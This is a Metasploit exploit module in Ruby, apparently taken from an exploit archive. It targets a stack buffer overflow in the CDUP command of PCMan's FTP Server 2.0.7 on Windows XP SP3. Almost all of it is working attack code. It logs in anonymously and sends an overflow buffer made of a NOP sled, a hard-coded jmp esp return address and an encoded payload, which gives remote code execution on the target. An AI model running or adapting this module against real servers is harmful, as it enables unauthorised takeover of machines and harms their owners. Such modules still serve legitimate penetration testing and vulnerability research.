# Exploit Title: PCMan's FTP Server 2.0.7 - 'CDUP' Command Buffer Overflow (Metasploit)
# Date: 12-10-2017
# Exploit Author: GiulioComi
# Vendor Homepage: http://pcman.openfoundry.org/
# Software Link: https://www.exploit-db.com/apps/9fceb6fefd0f3ca1a8c36e97b6cc925d-PCMan.7z
# Version: 2.0.7
# Tested on: Windows XP SP3 Eng
# CVE : N/A

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote

      include Msf::Exploit::Remote::Ftp


      def initialize(info = {})
                super(update_info(info,
                        'Name'           => 'PCMan\'s 2.0.7 FTP Server Buffer Overflow in CDUP command option',
                        'Description'    => %q{
                                        This module exploits a stack based buffer overflow in PCMAN's FTP Server 2.0.7.
                                        This exploit requires authentication but anonymous credentials are enabled by default.
                                             },
                        'Author'         => [ 'GiulioComi' ],
                        'Version'        => '$Revision: 1 $',
                        'License' => GPL_LICENSE,
 
                        'DefaultOptions' =>
                                {
                                        'EXITFUNC' => 'process',
                                },
                        'Payload'        =>
                                {
                                        'Space'    => 1400,
                                        'BadChars' => "\x00\x0a\x0d",
                                },
                        'Platform'       => 'win',

                        'Targets'        =>
			                     [
                                [
                                        'Windows XP SP3 Eng',
                                        { 'Ret' => 0x77fab277, 'Offset' => 2005 } 
                                 # @EIP <-- jmp esp in [SHLWAPI.dll] ASLR: False, Rebase: False, SAFESEH: True (C:\WINDOWS\system32\SHLWAPI.dll)
                                 ],
                            ],
                        'DefaultTarget' => 0
                        ))

                        register_options(
                        [
                                Opt::RPORT(21)
                        ], self.class)
       end


       def exploit

          print_status('Connecting to target FTP Server...')
          connect_login
          
          buffer = make_nops(target['Offset']) + [target.ret].pack('V') + make_nops(15) + payload.encoded
          
          send_cmd(['CDUP', buffer], false)
          handler
          disconnect

       end

end
